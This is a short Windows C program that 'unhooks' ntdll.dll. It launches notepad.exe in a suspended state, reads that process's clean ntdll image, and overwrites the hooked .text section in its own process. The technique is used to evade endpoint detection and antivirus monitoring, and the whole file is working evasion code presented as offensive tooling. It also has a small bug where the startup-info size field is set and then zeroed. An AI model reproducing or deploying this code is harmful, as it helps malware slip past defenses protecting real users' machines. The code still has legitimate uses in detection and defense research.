#include <windows.h>
#include <stdio.h>
#include <psapi.h>


BOOL UnHook( PVOID pNtdll ) {

    HANDLE hNtdll = GetModuleHandleA( "ntdll.dll" );

    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )pNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( DWORD_PTR )pNtdll + pDosHeader->e_lfanew );

    PIMAGE_SECTION_HEADER pSectionHeader = ( PIMAGE_SECTION_HEADER )( ( DWORD_PTR )pNtHeaders + sizeof( IMAGE_NT_HEADERS ) );

    for ( DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++ ) {
        if ( strcmp( ( LPCSTR )pSectionHeader->Name, ".text" ) == 0 ) {

            DWORD oldProtect;
            if ( !VirtualProtect( ( LPVOID )( ( DWORD64 )hNtdll + pSectionHeader->VirtualAddress ), pSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect ) ) {
                fprintf( stderr, "VirtualProtect failed: %d\n", GetLastError() );
                return FALSE;
            }

            memcpy( ( LPVOID )( ( DWORD64 )hNtdll + pSectionHeader->VirtualAddress ), ( LPVOID )( ( DWORD64 )pNtdll + pSectionHeader->VirtualAddress ), pSectionHeader->Misc.VirtualSize );

            if ( !VirtualProtect( ( LPVOID )( ( DWORD64 )hNtdll + pSectionHeader->VirtualAddress ), pSectionHeader->Misc.VirtualSize, oldProtect, &oldProtect ) ) {
                fprintf( stderr, "VirtualProtect failed: %d\n", GetLastError() );
                return FALSE;
            }
            break;
        }
    }

    return TRUE;

}

int main( void ) {

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    si.cb = sizeof( si );

    ZeroMemory( &si, sizeof( si ) );
    ZeroMemory( &pi, sizeof( PROCESS_INFORMATION ) );

    if ( !CreateProcessA( "C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
        fprintf( stderr, "CreateProcess failed: %d\n", GetLastError() );
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA( "ntdll.dll" );
    MODULEINFO modInfo;
    GetModuleInformation( GetCurrentProcess(), hNtdll, ( LPMODULEINFO )&modInfo, sizeof( MODULEINFO ) );

    LPVOID pNtdll = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, modInfo.SizeOfImage );

    if ( !pNtdll ) {
        fprintf( stderr, "HeapAlloc failed: %d\n", GetLastError() );
        return 1;
    }

    printf( "[+] Allocated memory at %p for ntdll.dll\n", pNtdll );

    if ( !ReadProcessMemory( pi.hProcess, modInfo.lpBaseOfDll, pNtdll, modInfo.SizeOfImage, NULL ) ) {
        fprintf( stderr, "ReadProcessMemory failed: %d\n", GetLastError() );
        return 1;
    }

    printf( "[+] Read ntdll.dll from suspended process\n" );

    TerminateProcess( pi.hProcess, 0 );

    if ( !UnHook( pNtdll ) ) {
        fprintf( stderr, "UnHook failed\n" );
        return 1;
    }

    printf( "[+] Unhooked ntdll.dll\n" );

    return 0;
}